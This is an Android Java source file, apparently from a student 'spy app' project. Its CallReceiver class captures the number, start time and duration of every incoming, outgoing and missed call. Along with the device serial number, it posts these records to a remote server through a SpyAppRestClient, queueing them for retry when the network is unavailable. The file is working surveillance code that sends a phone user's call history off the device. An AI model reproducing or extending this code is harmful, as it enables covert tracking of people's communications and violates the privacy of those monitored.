package com.example.natalia.super_inzynierka;

import android.content.Context;
import android.content.pm.PermissionGroupInfo;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.TimeUnit;

/**
 * Created by Natalia on 27.11.2016.
 */
public class CallReceiver extends ServiceReceiver {

    public static boolean network = false;
    public static ArrayList<String> listNumber = new ArrayList<>();
    public static ArrayList<String> listDate= new ArrayList<>();
    public static ArrayList<String> listTime = new ArrayList<>();
    public static ArrayList<String> listSerialNumber = new ArrayList<>();
    public static int index = 0;

    public static String serialNr = LocationTrace.serialNr;

    @Override
    protected void onIncomingCallReceived(Context ctx, String number, Date start) {
        //
        System.out.println("onIncomingCallReceived");
    }

    @Override
    protected void onIncomingCallAnswered(Context ctx, String number, Date start) {
        System.out.println("onIncomingCallAnswered");
        //
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end) {
        System.out.println("onIncomingCallEnded");
        long diff = getDateDiff(start, end, TimeUnit.MILLISECONDS);

        String time = displayStartTime(diff);
        System.out.println(time);

        String start_time = displayTime(start.getTime());
        System.out.println(start_time);
//        permissionManager = new PermissionManager();
//        serialNr = permissionManager.getSerialNr();
        serialNr = LocationTrace.serialNr;
        postRequest(number, start_time, time, serialNr);
        //
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start) {
        //
        System.out.println("onOutgoingCallStarted");
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end) {
        System.out.println("onOutgoingCallEnded");
        long diff = getDateDiff(start, end, TimeUnit.MILLISECONDS);

        String time = displayStartTime(diff);
        System.out.println(time);

        String start_time = displayTime(start.getTime());
        System.out.println(start_time);
//        permissionManager = new PermissionManager();
//        serialNr = permissionManager.getSerialNr();
        serialNr = LocationTrace.serialNr;
        postRequest(number, start_time, time, serialNr);
    }

    @Override
    protected void onMissedCall(Context ctx, String number, Date start) {
        System.out.println("onMissedCall");

        String start_time = displayTime(start.getTime());
        System.out.println(start_time);
//        permissionManager = new PermissionManager();
//        serialNr = permissionManager.getSerialNr();
        serialNr = LocationTrace.serialNr;
        postRequest(number, start_time, "--", serialNr);
        //
    }

    private void postRequest(final String number, final String date, final String time, final String serialNumber) {
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("time", time);
        params.put("log", serialNumber);
        SpyAppRestClient.post("create_connect/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                System.out.println("ON SUCCESS CALL");
                network = true;
                if(listNumber.size()>0){
                    System.out.println("List CALL size != 0");
                    for(int i=listNumber.size()-1; i>=0; i--) {
                        postRequest(listNumber.get(i), listDate.get(i), listTime.get(i), listSerialNumber.get(i));
                        System.out.println("take first CALL from list");
                        if (network){
                            System.out.println("remove call from list");
                            listNumber.remove(i);
                            listDate.remove(i);
                            listTime.remove(i);
                            listSerialNumber.remove(i);
                            index = index - 1;
                        }
                    }
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                System.out.println("ON FAILURE CALL");
                network = false;
                listNumber.add(index, number);
                listDate.add(index, date);
                listTime.add(index, time);
                listSerialNumber.add(index, serialNumber);
                System.out.println("ADDED SMS TO LIST , SIZE: " + listNumber.size() );
                index = index + 1;
            }
        });
    }

    private static long getDateDiff(Date date1, Date date2, TimeUnit timeUnit) {
        long diffInMillies = date2.getTime() - date1.getTime();
        return timeUnit.convert(diffInMillies, TimeUnit.MILLISECONDS);
    }

    private String displayTime(long millis){
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(millis);
        String min;
        String month;
        String day;
        int mYear = calendar.get(Calendar.YEAR);
        int mMonth = calendar.get(Calendar.MONTH);
        int mDay = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        mMonth = mMonth + 1;

        min = Integer.toString(minute);
        if (minute < 10) min = "0" + minute;
        month = Integer.toString(mMonth);
        if (mMonth < 10) month = "0" + mMonth;
        day = Integer.toString(mDay);
        if (mDay < 10) day = "0" + mDay;

        String start_time = day + "-" + month + "-" + mYear + "  " + hour + ":" + min;
        return start_time;
    }

    private String displayStartTime(long millis){
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(millis);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        int second = calendar.get(Calendar.SECOND);
        String min;
        String sec;
        String h;
        if (minute < 10) {
            min = "0" + minute;
        } else {
            min = Integer.toString(minute);
        }
        if (second < 10) {
            sec = "0" + second;
        } else {
            sec = Integer.toString(second);
        }
        if ((millis / 3600000) < 1) {
            h = "00";
        } else {
            h = Integer.toString(hour);
        }

        String time = h + ":" + min + ":" + sec;
        return time;
    }
}
